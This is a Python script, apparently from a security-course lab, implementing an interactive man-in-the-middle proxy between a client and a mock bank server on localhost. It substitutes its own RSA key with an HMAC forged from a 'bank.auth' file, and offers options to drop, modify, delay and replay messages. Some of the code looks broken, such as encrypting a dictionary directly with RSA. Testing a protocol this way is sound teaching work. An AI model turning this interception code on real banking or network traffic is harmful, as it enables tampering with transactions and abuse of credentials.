import argparse
import hashlib
import hmac
import random
import sys
from socket import *
import time

from cryptography.hazmat.primitives import serialization, padding, hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import load_pem_public_key

clients = []

seqNumb = 0
vccSeqNumb = 0
# ordem para criar conta de user = f rc f rb sc
# This function parses the arguments
def parse_args():
    parser = argparse.ArgumentParser(description='mitm')
    parser.add_argument('-p', metavar='mitm-port', type=int, default = 3000, help='The port that mitm will listen on. Defaults to 4000.')
    parser.add_argument('-s', metavar='server-ip-address', type=str, default='127.0.0.1', help='The ip that the store or the bank will listen on')
    parser.add_argument('-q', metavar='server-port', type=int, default = 4000, help='The port that the bank or store are running on')
    return parser.parse_args()

def handle_mitm(client_socket, args):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )

    public_key = private_key.public_key()
    # vamos gerar um novo par de chaves publicas e privadas para o mitm

    db = 0 # data from bank
    # isto serve para o client
    """
    data1 = client_socket.recv(1024)
    print("Received data from client:")
    print(data1)
    bank_sock = socket(AF_INET, SOCK_STREAM)
    bank_sock.connect((args.s, args.q))
    bank_sock.send(data1)
    data2 = client_socket.recv(1024)
    print("Received data from client:")
    print(data2)
    bank_sock.send(data2)
    data3 = bank_sock.recv(1024)
    print("Received data from bank:")
    print(data3)
    client_socket.send(data3)
    data4 = client_socket.recv(1024)
    bank_sock.send(data4)
    #AUTENTICAÇÃO
    data5 = client_socket.recv(1024)
    print("Received data from client:")
    print(data5)
    bank_sock.send(data5)
    data6 = bank_sock.recv(1024)
    print("Received data from bank:")
    print(data6)
    client_socket.send(data6)
    data7 = bank_sock.recv(1024)
    print("Received data from bank:")
    print(data7)
    client_socket.send(data7)
    data8 = client_socket.recv(1024)
    print("Received data from client:")
    print(data8)
    bank_sock.send(data8)
    data9 = bank_sock.recv(1024)
    print("Received data from bank:")
    print(data9)
    client_socket.send(data9)
    """
    data1 = client_socket.recv(1024)
    print("Received hmac e pubkey Client from client:")
    print(data1)



    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    with open("bank.auth", 'rb') as f:
        bytes = f.read()
    initial_key = bytes[:32]
    bank_key = load_pem_public_key(bytes[32:])
    hmac_hash = hmac.new(initial_key, digestmod=hashlib.sha256)
    hmac_hash.update(pem)
    establishreq = {
        'op': 'establishreq',
        'challenge': str(random.randint(0,pow(10,50)))
    }

    req = bank_key.encrypt(
        establishreq,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))

    bank_sock = socket(AF_INET, SOCK_STREAM)
    bank_sock.connect((args.s, args.q))
    bank_sock.send(hmac_hash.digest() + pem)
    data2 = client_socket.recv(1024)
    print("Received data from client:")
    print(data2)
    bank_sock.send(data2)
    data3 = bank_sock.recv(1024)
    print("Received data from bank:")
    print(data3)
    client_socket.send(data3)
    data4 = client_socket.recv(1024)
    bank_sock.send(data4)
    # AUTENTICAÇÃO
    data5 = client_socket.recv(1024)
    print("Received data from client:")
    print(data5)
    bank_sock.send(data5)
    data6 = bank_sock.recv(1024)
    print("Received data from bank:")
    print(data6)
    client_socket.send(data6)
    data7 = bank_sock.recv(1024)
    print("Received data from bank:")
    print(data7)
    client_socket.send(data7)
    data8 = client_socket.recv(1024)
    print("Received data from client:")
    print(data8)
    bank_sock.send(data8)
    data9 = bank_sock.recv(1024)
    print("Received data from bank:")
    print(data9)
    client_socket.send(data9)


    while True:
        val = input("\nWhat do you want to do?"
                    "\n(D)rop"
                    "\n(M)odify"
                    "\n(Rc)eceive Client"
                    "\n(Rb)eceive Bank"
                    "\n(Sc)end Client"
                    "\n(Sb)end Bank"
                    "\n")
        if val.lower() == "d":
         print("dropped")

        if val.lower() == "rc":
            data = client_socket.recv(1024)
            print("Received data from client:")
            print(data)
        if val.lower() == "rb":
            data = bank_sock.recv(1024)
            print("Received data from bank:")
            print(data)

        if val == "sc":
            client_socket.send(data)

        if val == "sb":
            bank_sock.send(data)


        if val.lower() == "m":
            val = input("\nEnter the new message: ")
            modified_data = val.encode()
            delay = float(input("\nEnter the delay (in seconds) before sending the modified data: "))
            time.sleep(delay)
        
            with socket(AF_INET, SOCK_STREAM) as cli_sock:
                cli_sock.connect((args.s, args.q))
                cli_sock.send(modified_data)
                data = cli_sock.recv(1024)
                print("Received data from bank after modification:")
                print(data)
                client_socket.send(data)
        val = ""





if __name__ == "__main__":
    args = parse_args()
    print("Starting man-in-the-middle with the following configuration:")
    print(f"MITM Port: {args.p}")
    print(f"Server IP: {args.s}")
    print(f"Server Port: {args.q}")
    
    server_socket = socket(AF_INET, SOCK_STREAM)
    server_socket.bind(('127.0.0.1', args.p))
    server_socket.listen()

    print("Man-in-the-middle is listening...")

    while True:
        try:
            client_socket, _ = server_socket.accept()
            print("Accepted connection from client")
            handle_mitm(client_socket, args)
        except Exception as e:
            print("Error occurred:", e)

